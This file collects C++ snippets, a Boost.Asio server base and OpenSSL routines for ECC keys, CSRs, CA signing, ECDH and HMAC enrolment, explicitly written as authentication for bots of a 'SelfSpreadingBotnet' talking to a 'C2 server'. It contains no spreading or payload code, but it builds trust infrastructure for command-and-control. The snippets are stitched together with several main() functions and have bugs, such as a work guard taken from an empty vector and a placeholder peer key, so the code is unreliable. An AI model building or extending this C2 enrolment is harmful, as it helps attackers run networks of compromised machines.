// multiple io connections
#include <boost/asio.hpp>
#include <thread>
#include <vector>

class BaseServer {
private:
    std::vector<std::shared_ptr<boost::asio::io_context>> io_contexts_;  // Multiple io_contexts
    std::vector<std::thread> threads_;  // Threads for running the io_contexts
    boost::asio::io_context::work work_;  // Ensures the io_contexts keep running
    std::size_t next_io_context_;  // To round-robin between io_contexts

    std::unique_ptr<tcp::acceptor> acceptor_;  // Single acceptor to distribute connections

public:
    BaseServer(const std::string& server_address, int server_port, std::size_t num_threads)
        : work_(boost::asio::make_work_guard(*io_contexts_.front())), next_io_context_(0)
    {
        // Create multiple io_contexts based on number of threads
        for (std::size_t i = 0; i < num_threads; ++i) {
            auto io_context = std::make_shared<boost::asio::io_context>();
            io_contexts_.push_back(io_context);
        }

        // Create a single acceptor for all io_contexts
        acceptor_ = std::make_unique<tcp::acceptor>(*io_contexts_.front(),
                   tcp::endpoint(boost::asio::ip::make_address(server_address), server_port));

        // Launch threads for each io_context
        for (std::size_t i = 0; i < num_threads; ++i) {
            threads_.emplace_back([this, i] {
                io_contexts_[i]->run();  // Run each io_context in its own thread
            });
        }

        do_accept();  // Start accepting clients
    }

    ~BaseServer() {
        for (auto& t : threads_) {
            t.join();
        }
    }

protected:
    void do_accept() {
        auto socket = std::make_shared<tcp::socket>(*io_contexts_[next_io_context_]);
        acceptor_->async_accept(*socket, [this, socket](boost::system::error_code ec) {
            if (!ec) {
                // Handle the connection (delegate to derived class)
                handle_client(socket);
            }
            next_io_context_ = (next_io_context_ + 1) % io_contexts_.size();  // Round-robin the io_context
            do_accept();  // Accept the next client
        });
    }

    virtual void handle_client(std::shared_ptr<tcp::socket> socket) = 0;  // To be implemented by derived classes
};


// Generating ECC key pairs 
#include <openssl/ec.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <iostream>

void generate_ECC_keypair(const char* private_key_file, const char* public_key_file) {
    int ret;
    EC_KEY *ec_key = nullptr;
    BIO *bp_private = nullptr, *bp_public = nullptr;

    // 1. Create a new EC key using the secp256k1 curve
    ec_key = EC_KEY_new_by_curve_name(NID_secp256k1);  // Use the secp256k1 curve
    if (!ec_key) {
        std::cerr << "Failed to create new EC Key" << std::endl;
        return;
    }

    // 2. Generate the private key
    ret = EC_KEY_generate_key(ec_key);
    if (ret != 1) {
        std::cerr << "Failed to generate ECC key" << std::endl;
        return;
    }

    // 3. Save the private key in PEM format
    bp_private = BIO_new_file(private_key_file, "w+");
    PEM_write_bio_ECPrivateKey(bp_private, ec_key, NULL, NULL, 0, NULL, NULL);

    // 4. Save the public key in PEM format
    bp_public = BIO_new_file(public_key_file, "w+");
    PEM_write_bio_EC_PUBKEY(bp_public, ec_key);

    // 5. Clean up
    BIO_free_all(bp_private);
    BIO_free_all(bp_public);
    EC_KEY_free(ec_key);

    std::cout << "ECC key pair generated and saved!\n";
}

int main() {
    generate_ECC_keypair("server_private_key.pem", "server_public_key.pem");
    return 0;
}

// Creating CSR
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/err.h>

// Function to create a CSR using the ECC private key
X509_REQ* generate_CSR(EVP_PKEY* pkey, const char* CN) {
    X509_REQ *x509_req = X509_REQ_new();
    X509_NAME *name = X509_NAME_new();

    // Set the subject name for the CSR
    X509_NAME_add_entry_by_txt(name, "C", MBSTRING_ASC, (unsigned char*)"US", -1, -1, 0);
    X509_NAME_add_entry_by_txt(name, "O", MBSTRING_ASC, (unsigned char*)"MyBotnetOrg", -1, -1, 0);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC, (unsigned char*)CN, -1, -1, 0);  // Bot Common Name

    X509_REQ_set_subject_name(x509_req, name);

    // Set the public key for the CSR
    X509_REQ_set_pubkey(x509_req, pkey);

    // Sign the CSR with the private key
    X509_REQ_sign(x509_req, pkey, EVP_sha256());

    X509_NAME_free(name);
    return x509_req;
}

int main() {
    // Load the private key (bot private key)
    FILE *fp = fopen("bot_private_key.pem", "r");
    EC_KEY *ec_key = PEM_read_ECPrivateKey(fp, NULL, NULL, NULL);
    fclose(fp);

    if (!ec_key) {
        std::cerr << "Failed to load private key\n";
        return 1;
    }

    // Convert EC_KEY to EVP_PKEY (required for signing with OpenSSL APIs)
    EVP_PKEY *pkey = EVP_PKEY_new();
    EVP_PKEY_set1_EC_KEY(pkey, ec_key);

    // Generate CSR for the bot with common name "BotID123"
    X509_REQ *csr = generate_CSR(pkey, "BotID123");

    // Write CSR to a PEM file
    FILE *csr_file = fopen("bot_csr.pem", "w");
    PEM_write_X509_REQ(csr_file, csr);
    fclose(csr_file);

    // Clean up
    EVP_PKEY_free(pkey);
    X509_REQ_free(csr);
    EC_KEY_free(ec_key);

    std::cout << "CSR generated and saved!\n";
    return 0;
}

// Signing CSR on server side
X509* sign_CSR(X509_REQ* req, EVP_PKEY* ca_pkey, X509* ca_cert) {
    X509 *x509 = X509_new();

    // Set the version of the certificate (v3)
    X509_set_version(x509, 2);

    // Set the serial number
    ASN1_INTEGER_set(X509_get_serialNumber(x509), 1);

    // Set the validity of the certificate (1 year)
    X509_gmtime_adj(X509_get_notBefore(x509), 0);
    X509_gmtime_adj(X509_get_notAfter(x509), 31536000L);  // 1 year validity

    // Set the public key from the CSR
    EVP_PKEY *pubkey = X509_REQ_get_pubkey(req);
    X509_set_pubkey(x509, pubkey);
    EVP_PKEY_free(pubkey);

    // Set the subject name from the CSR
    X509_NAME *subject = X509_REQ_get_subject_name(req);
    X509_set_subject_name(x509, subject);

    // Set the issuer name from the CA certificate
    X509_set_issuer_name(x509, X509_get_subject_name(ca_cert));

    // Sign the certificate with the CA's private key (ECC)
    X509_sign(x509, ca_pkey, EVP_sha256());

    return x509;
}

int main() {
    // Load the CA private key (server private key)
    FILE *ca_fp = fopen("ca_private_key.pem", "r");
    EVP_PKEY *ca_pkey = PEM_read_PrivateKey(ca_fp, NULL, NULL, NULL);
    fclose(ca_fp);

    // Load the CA certificate
    FILE *ca_cert_fp = fopen("ca_cert.pem", "r");
    X509 *ca_cert = PEM_read_X509(ca_cert_fp, NULL, NULL, NULL);
    fclose(ca_cert_fp);

    // Load the bot's CSR
    FILE *csr_fp = fopen("bot_csr.pem", "r");
    X509_REQ *csr = PEM_read_X509_REQ(csr_fp, NULL, NULL, NULL);
    fclose(csr_fp);

    // Sign the CSR to issue a certificate for the bot
    X509 *bot_cert = sign_CSR(csr, ca_pkey, ca_cert);

    // Save the signed certificate
    FILE *cert_file = fopen("bot_cert.pem", "w");
    PEM_write_X509(cert_file, bot_cert);
    fclose(cert_file);

    // Clean up
    EVP_PKEY_free(ca_pkey);
    X509_free(bot_cert);
    X509_free(ca_cert);
    X509_REQ_free(csr);

    std::cout << "CSR signed and certificate generated!\n";
    return 0;
}

// Verify signed certificate
int verify_certificate(X509* cert, X509* ca_cert) {
    // Create a certificate store and add the CA certificate to it
    X509_STORE *store = X509_STORE_new();
    X509_STORE_add_cert(store, ca_cert);

    // Create a context to verify the certificate
    X509_STORE_CTX *ctx = X509_STORE_CTX_new();
    X509_STORE_CTX_init(ctx, store, cert, NULL);

    // Perform the verification
    int result = X509_verify_cert(ctx);

    // Clean up
    X509_STORE_CTX_free(ctx);
    X509_STORE_free(store);

    return result;
}

int main() {
    // Load the bot certificate
    FILE *cert_fp = fopen("bot_cert.pem", "r");
    X509 *bot_cert = PEM_read_X509(cert_fp, NULL, NULL, NULL);
    fclose(cert_fp);

    // Load the CA certificate
    FILE *ca_cert_fp = fopen("ca_cert.pem", "r");
    X509 *ca_cert = PEM_read_X509(ca_cert_fp, NULL, NULL, NULL);
    fclose(ca_cert_fp);

    // Verify the bot's certificate against the CA certificate
    if (verify_certificate(bot_cert, ca_cert) == 1) {
        std::cout << "Certificate verified successfully!\n";
    } else {
        std::cerr << "Certificate verification failed.\n";
    }

    // Clean up
    X509_free(bot_cert);
    X509_free(ca_cert);

    return 0;
}

//ECDH key generation 
#include <openssl/ec.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/kdf.h>
#include <openssl/err.h>
#include <iostream>
#include <vector>

// Function to perform ECDH and derive shared secret
std::vector<unsigned char> derive_shared_secret(EC_KEY* ec_key, const EC_POINT* peer_pub_key) {
    EVP_PKEY* pkey = EVP_PKEY_new();
    EVP_PKEY_assign_EC_KEY(pkey, ec_key);

    EVP_PKEY* peer_pkey = EVP_PKEY_new();
    EC_KEY* peer_ec_key = EC_KEY_new_by_curve_name(NID_secp256k1);
    EC_KEY_set_public_key(peer_ec_key, peer_pub_key);
    EVP_PKEY_assign_EC_KEY(peer_pkey, peer_ec_key);

    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(pkey, NULL);
    if (!ctx) {
        std::cerr << "Failed to create EVP_PKEY_CTX" << std::endl;
        return {};
    }

    // Derive shared secret
    if (EVP_PKEY_derive_init(ctx) <= 0) {
        std::cerr << "Failed to initialize key derivation" << std::endl;
        return {};
    }

    if (EVP_PKEY_derive_set_peer(ctx, peer_pkey) <= 0) {
        std::cerr << "Failed to set peer key" << std::endl;
        return {};
    }

    size_t secret_len = 0;
    EVP_PKEY_derive(ctx, NULL, &secret_len);

    std::vector<unsigned char> secret(secret_len);
    if (EVP_PKEY_derive(ctx, secret.data(), &secret_len) <= 0) {
        std::cerr << "Failed to derive shared secret" << std::endl;
        return {};
    }

    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(peer_pkey);
    EVP_PKEY_free(pkey);

    return secret;
}

int main() {
    // Load bot's private key for ECDH
    FILE* priv_fp = fopen("bot_private_key.pem", "r");
    EC_KEY* ec_key = PEM_read_ECPrivateKey(priv_fp, NULL, NULL, NULL);
    fclose(priv_fp);

    if (!ec_key) {
        std::cerr << "Failed to load private key\n";
        return 1;
    }

    // Simulate receiving peer public key (from server)
    EC_POINT* peer_pub_key = EC_POINT_new(EC_KEY_get0_group(ec_key));
    EC_POINT_oct2point(EC_KEY_get0_group(ec_key), peer_pub_key, reinterpret_cast<const unsigned char*>("ServerPublicKeyInBytes"), strlen("ServerPublicKeyInBytes"), NULL);

    // Derive shared secret
    std::vector<unsigned char> shared_secret = derive_shared_secret(ec_key, peer_pub_key);
    std::cout << "Shared secret derived. Length: " << shared_secret.size() << "\n";

    // Clean up
    EC_POINT_free(peer_pub_key);
    EC_KEY_free(ec_key);

    return 0;
}


// BOT AUTHENTIACTION USING KEY PAIR, CSR, HMAC
#include <openssl/hmac.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <iostream>
#include <string>
#include <vector>

// Pre-shared token (init_token) known to both the bot and the C2 server
const std::string init_token = "bot_init_secret_123";

// Function to generate a CSR (Certificate Signing Request)
X509_REQ* generate_CSR(EVP_PKEY* pkey, const char* CN) {
    X509_REQ* x509_req = X509_REQ_new();
    X509_NAME* name = X509_NAME_new();

    // Set subject name
    X509_NAME_add_entry_by_txt(name, "C", MBSTRING_ASC, (unsigned char*)"US", -1, -1, 0);
    X509_NAME_add_entry_by_txt(name, "O", MBSTRING_ASC, (unsigned char*)"SelfSpreadingBotnet", -1, -1, 0);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC, (unsigned char*)CN, -1, -1, 0);

    X509_REQ_set_subject_name(x509_req, name);
    X509_REQ_set_pubkey(x509_req, pkey);

    // Sign the CSR with the private key
    X509_REQ_sign(x509_req, pkey, EVP_sha256());

    X509_NAME_free(name);
    return x509_req;
}

// Function to calculate HMAC using the bot's public key and the init_token
std::vector<unsigned char> compute_hmac(EVP_PKEY* pkey, const std::string& init_token) {
    unsigned char* pubkey_data = NULL;
    int pubkey_len = i2d_PublicKey(pkey, &pubkey_data);  // Convert public key to DER format

    if (pubkey_len <= 0) {
        std::cerr << "Failed to extract public key.\n";
        return {};
    }

    // Compute HMAC using the init_token and the public key
    unsigned int hmac_len = EVP_MAX_MD_SIZE;
    std::vector<unsigned char> hmac_result(hmac_len);
    HMAC(EVP_sha256(), init_token.data(), init_token.size(), pubkey_data, pubkey_len, hmac_result.data(), &hmac_len);

    OPENSSL_free(pubkey_data);
    hmac_result.resize(hmac_len);  // Resize to the actual length of the HMAC
    return hmac_result;
}

int main() {
    // Generate a private key for the bot
    EVP_PKEY* pkey = EVP_PKEY_new();
    EC_KEY* ec_key = EC_KEY_new_by_curve_name(NID_secp256k1);  // Use secp256k1 curve
    EC_KEY_generate_key(ec_key);
    EVP_PKEY_assign_EC_KEY(pkey, ec_key);

    // Generate a CSR for the bot
    X509_REQ* csr = generate_CSR(pkey, "SelfSpreadingBotID");

    // Compute HMAC of the bot's public key using the init_token
    std::vector<unsigned char> hmac = compute_hmac(pkey, init_token);

    // Output the HMAC value (to be sent to the server)
    std::cout << "HMAC of the public key: ";
    for (unsigned char byte : hmac) {
        printf("%02x", byte);
    }
    std::cout << "\n";

    // Save the CSR and HMAC to send to the server
    FILE* csr_file = fopen("bot_csr.pem", "w");
    PEM_write_X509_REQ(csr_file, csr);
    fclose(csr_file);

    // Save the private key to a file
    FILE* pkey_file = fopen("bot_private_key.pem", "w");
    PEM_write_PrivateKey(pkey_file, pkey, NULL, NULL, 0, NULL, NULL);
    fclose(pkey_file);

    std::cout << "CSR and HMAC ready to be sent to the server.\n";

    // Cleanup
    X509_REQ_free(csr);
    EVP_PKEY_free(pkey);

    return 0;
}

// SERVER SIDE EQUIVALENT
#include <openssl/hmac.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <iostream>
#include <vector>
#include <string>

// Pre-shared token stored on the server (must match the bot's init_token)
const std::string init_token = "bot_init_secret_123";

// Function to verify the HMAC of the bot's public key
bool verify_hmac(EVP_PKEY* pkey, const std::vector<unsigned char>& received_hmac, const std::string& init_token) {
    // Convert public key to DER format
    unsigned char* pubkey_data = NULL;
    int pubkey_len = i2d_PublicKey(pkey, &pubkey_data);

    if (pubkey_len <= 0) {
        std::cerr << "Failed to extract public key.\n";
        return false;
    }

    // Recalculate HMAC using the init_token and the public key
    unsigned int hmac_len = EVP_MAX_MD_SIZE;
    std::vector<unsigned char> calculated_hmac(hmac_len);
    HMAC(EVP_sha256(), init_token.data(), init_token.size(), pubkey_data, pubkey_len, calculated_hmac.data(), &hmac_len);
    OPENSSL_free(pubkey_data);

    // Compare the received HMAC with the calculated HMAC
    calculated_hmac.resize(hmac_len);
    return (calculated_hmac == received_hmac);
}

// Function to issue a certificate by signing the CSR
X509* issue_certificate(X509_REQ* csr, EVP_PKEY* ca_pkey, X509* ca_cert) {
    X509* cert = X509_new();

    // Set the version of the certificate (v3)
    X509_set_version(cert, 2);

    // Set the serial number
    ASN1_INTEGER_set(X509_get_serialNumber(cert), 1);

    // Set the certificate validity (1 year)
    X509_gmtime_adj(X509_get_notBefore(cert), 0);
    X509_gmtime_adj(X509_get_notAfter(cert), 31536000L);

    // Set the public key from the CSR
    EVP_PKEY* pubkey = X509_REQ_get_pubkey(csr);
    X509_set_pubkey(cert, pubkey);
    EVP_PKEY_free(pubkey);

    // Set the subject name from the CSR
    X509_NAME* subject = X509_REQ_get_subject_name(csr);
    X509_set_subject_name(cert, subject);

    // Set the issuer name from the CA certificate
    X509_set_issuer_name(cert, X509_get_subject_name(ca_cert));

    // Sign the certificate with the CA's private key
    X509_sign(cert, ca_pkey, EVP_sha256());

    return cert;
}

int main() {
    // Load the CA's private key
    FILE* ca_key_file = fopen("ca_private_key.pem", "r");
    EVP_PKEY* ca_pkey = PEM_read_PrivateKey(ca_key_file, NULL, NULL, NULL);
    fclose(ca_key_file);

    // Load the CA's certificate
    FILE* ca_cert_file = fopen("ca_cert.pem", "r");
    X509* ca_cert = PEM_read_X509(ca_cert_file, NULL, NULL, NULL);
    fclose(ca_cert_file);

    // Load the bot's CSR
    FILE* csr_file = fopen("bot_csr.pem", "r");
    X509_REQ* csr = PEM_read_X509_REQ(csr_file, NULL, NULL, NULL);
    fclose(csr_file);

    // Simulate receiving the HMAC from the bot
    std::vector<unsigned char> received_hmac = { /* HMAC data received from the bot */ };

    // Verify the HMAC using the init_token
    EVP_PKEY* pubkey = X509_REQ_get_pubkey(csr);
    if (verify_hmac(pubkey, received_hmac, init_token)) {
        std::cout << "HMAC verified successfully! Proceeding with certificate issuance.\n";

        // Issue a certificate by signing the CSR
        X509* cert = issue_certificate(csr, ca_pkey, ca_cert);

        // Save the issued certificate to a file
        FILE* cert_file = fopen("bot_cert.pem", "w");
        PEM_write_X509(cert_file, cert);
        fclose(cert_file);

        std::cout << "Certificate issued and saved for the bot.\n";

        // Cleanup
        X509_free(cert);
    } else {
        std::cerr << "HMAC verification failed! Certificate will not be issued.\n";
    }

    // Cleanup
    EVP_PKEY_free(pubkey);
    X509_free(ca_cert);
    X509_REQ_free(csr);
    EVP_PKEY_free(ca_pkey);

    return 0;
}

// VERIFY CERTIFICATE ON SERVER SIDE 
#include <openssl/x509.h>
#include <openssl/x509_vfy.h>
#include <openssl/pem.h>
#include <iostream>

// Function to verify a certificate against a trusted CA certificate
bool verify_certificate(X509* cert, const char* ca_cert_file) {
    // Load the CA certificate
    FILE* ca_fp = fopen(ca_cert_file, "r");
    X509* ca_cert = PEM_read_X509(ca_fp, NULL, NULL, NULL);
    fclose(ca_fp);

    if (!ca_cert) {
        std::cerr << "Failed to load CA certificate.\n";
        return false;
    }

    // Create a new X509_STORE and add the CA certificate
    X509_STORE* store = X509_STORE_new();
    X509_STORE_add_cert(store, ca_cert);

    // Create a new X509_STORE_CTX to verify the certificate
    X509_STORE_CTX* ctx = X509_STORE_CTX_new();
    X509_STORE_CTX_init(ctx, store, cert, NULL);

    // Verify the certificate
    bool result = (X509_verify_cert(ctx) == 1);

    // Clean up
    X509_STORE_CTX_free(ctx);
    X509_STORE_free(store);
    X509_free(ca_cert);

    return result;
}

// Example usage in main
int main() {
    // Load the bot's certificate
    X509* bot_cert = load_certificate("bot_cert.pem");
    if (!bot_cert) {
        return 1;
    }

    // Verify the bot's certificate using the CA certificate
    if (verify_certificate(bot_cert, "ca_cert.pem")) {
        std::cout << "Bot certificate is valid.\n";
    } else {
        std::cerr << "Bot certificate verification failed.\n";
    }

    X509_free(bot_cert);  // Clean up
    return 0;
}


// BOT LOADS CERTIFICATE 
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <iostream>

// Function to load and present a certificate (bot's certificate)
X509* load_certificate(const char* cert_file) {
    FILE* cert_fp = fopen(cert_file, "r");
    if (!cert_fp) {
        std::cerr << "Failed to open certificate file: " << cert_file << "\n";
        return NULL;
    }

    X509* cert = PEM_read_X509(cert_fp, NULL, NULL, NULL);
    fclose(cert_fp);

    if (!cert) {
        std::cerr << "Failed to load certificate.\n";
    }

    return cert;
}

// Example usage in main
int main() {
    // Load the bot's certificate
    X509* bot_cert = load_certificate("bot_cert.pem");
    if (!bot_cert) {
        return 1;
    }

    // In a real scenario, you would send this certificate to the C2 server for validation
    // and also receive and validate the C2 server's certificate.

    X509_free(bot_cert);  // Clean up after use
    return 0;
}

// LOAD TRUSTED CA SERVER CERTIFICATE
// Function to load the CA certificate from a file
X509* load_ca_certificate(const char* ca_cert_file) {
    FILE* ca_fp = fopen(ca_cert_file, "r");
    if (!ca_fp) {
        std::cerr << "Failed to open CA certificate file: " << ca_cert_file << "\n";
        return NULL;
    }

    X509* ca_cert = PEM_read_X509(ca_fp, NULL, NULL, NULL);
    fclose(ca_fp);

    if (!ca_cert) {
        std::cerr << "Failed to load CA certificate.\n";
    }

    return ca_cert;
}
// Function to verify the bot's certificate against the CA certificate
bool verify_certificate(X509* bot_cert, X509* ca_cert) {
    // Create a new X509_STORE to hold the CA certificate
    X509_STORE* store = X509_STORE_new();
    if (!store) {
        std::cerr << "Failed to create X509_STORE.\n";
        return false;
    }

    // Add the CA certificate to the store
    if (X509_STORE_add_cert(store, ca_cert) != 1) {
        std::cerr << "Failed to add CA certificate to the store.\n";
        X509_STORE_free(store);
        return false;
    }

    // Create a new X509_STORE_CTX to verify the bot's certificate
    X509_STORE_CTX* ctx = X509_STORE_CTX_new();
    if (!ctx) {
        std::cerr << "Failed to create X509_STORE_CTX.\n";
        X509_STORE_free(store);
        return false;
    }

    // Initialize the context with the bot's certificate and the CA store
    if (X509_STORE_CTX_init(ctx, store, bot_cert, NULL) != 1) {
        std::cerr << "Failed to initialize X509_STORE_CTX.\n";
        X509_STORE_CTX_free(ctx);
        X509_STORE_free(store);
        return false;
    }

    // Perform the verification
    int result = X509_verify_cert(ctx);
    if (result == 1) {
        std::cout << "Certificate verification successful.\n";
    } else {
        int err = X509_STORE_CTX_get_error(ctx);
        std::cerr << "Certificate verification failed: " << X509_verify_cert_error_string(err) << "\n";
    }

    // Cleanup
    X509_STORE_CTX_free(ctx);
    X509_STORE_free(store);

    return (result == 1);
}
